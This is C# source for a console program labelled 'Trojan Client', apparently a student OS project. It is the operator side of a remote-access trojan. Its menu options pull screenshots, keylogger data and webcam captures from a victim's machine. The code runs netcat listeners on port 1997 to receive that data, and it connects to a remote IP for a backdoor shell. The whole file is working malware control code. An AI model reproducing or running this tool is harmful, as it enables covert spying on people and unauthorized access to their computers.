using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace OSProject_Client
{
    class Program
    {
        static int ImageCounter = 0;
        static int LogCounter = 0;
        static int CapCounter = 0;

        static void Main(string[] args)
        {
            bool execute = true;

            while (execute)
            {
                string userCall = string.Empty;
                Console.WriteLine("-----------------------------------------------------------------------------------------------------------------------");
                Console.WriteLine("\t\t\t\t\t\t\tTrojan Client");
                Console.Write("------------------------------------------------------------------------------------------------------------------------");
                Console.WriteLine("\t\t\t\t\t[-s] Take a screenshot from the remote computer.");
                Console.WriteLine("\t\t\t\t\t[-k] Take key logger data from the remote computer");
                Console.WriteLine("\t\t\t\t\t[-m] Take a picture from the remote host's camera");
                Console.WriteLine("\t\t\t\t\t[-c] launch backdoor access console");
                Console.WriteLine("\t\t\t\t\t[any key] Exit");
                Console.WriteLine("------------------------------------------------------------------------------------------------------------------------");
                Console.Write("Trojan Client >> ");

                userCall = Console.ReadLine();
                string c_userCall = userCall.Trim();

                switch (c_userCall)
                {
                    case "-s":
                        {
                            BeginListen(0);
                            break;
                        }
                    case "-k":
                        {
                            BeginListen(1);
                            break;
                        }
                    case "-c":
                        {
                            BeginListen(2);
                            break;
                        }
                    case "-m":
                        {
                            BeginListen(3);
                            break;
                        }
                    default:
                        {
                            execute = false;
                            break;
                        }
                }

                Console.Clear();
            }
        }

        protected static void BeginListen(int mode)
        {
            string command = string.Empty;
            Process commandLine = new Process();
            commandLine.StartInfo.FileName = "cmd.exe";
            commandLine.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            commandLine.StartInfo.UseShellExecute = false;
            switch (mode)
            {
                case 0:
                    {
                        command = "/c nc -v -l -p 1997 > screen_capture.png";
                        ImageCounter++;
                        break;
                    }
                case 1:
                    {
                        command = "/c nc -v -l -p 1997 > log.txt";
                        LogCounter++;
                        break;
                    }
                case 2:
                    {
                        commandLine.StartInfo.UseShellExecute = true;
                        Console.Write("Enter remote I.P. Address >> ");
                        string h_IP = Console.ReadLine();
                        IPAddress address = null;

                        while (address == null)
                        {
                            bool h_address = IPAddress.TryParse(h_IP, out address);
                            if (h_address == false)
                            {
                                Console.WriteLine("Invalid I.P.");
                                Console.Write("Enter remote I.P. Address: ");
                                h_IP = Console.ReadLine();
                            }
                        }

                        command = string.Format("/c nc {0} 1997".Trim(), address);
                        break;
                    }
                case 3:
                    {
                        command = "/c nc -v -l -p 1997 > camera_capture.bmp";
                        CapCounter++;
                        break;
                    }
            }

            commandLine.StartInfo.Arguments = command;

            ThreadStart ths = new ThreadStart(() => commandLine.Start());
            Thread th = new Thread(ths);
            th.Start();
        }

        protected void startBackdoor()
        {
            Console.Write("Enter remote I.P. Address >> ");
            string h_IP = Console.ReadLine();
            IPAddress address = null;

            while (address == null)
            {
                bool h_address = IPAddress.TryParse(h_IP, out address);
                if (h_address == false)
                {
                    Console.WriteLine("Invalid I.P.");
                    Console.Write("Enter remote I.P. Address >> ");
                    h_IP = Console.ReadLine();
                }
            }


            Process commandLine = new Process();
            commandLine.StartInfo.FileName = "cmd.exe";
            commandLine.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            commandLine.StartInfo.Arguments = string.Format("/c nc {0} 1997".Trim(), address);
            Console.WriteLine();

            ThreadStart ths = new ThreadStart(() => commandLine.Start());
            Thread th = new Thread(ths);
            th.Start();

        }


    }
}

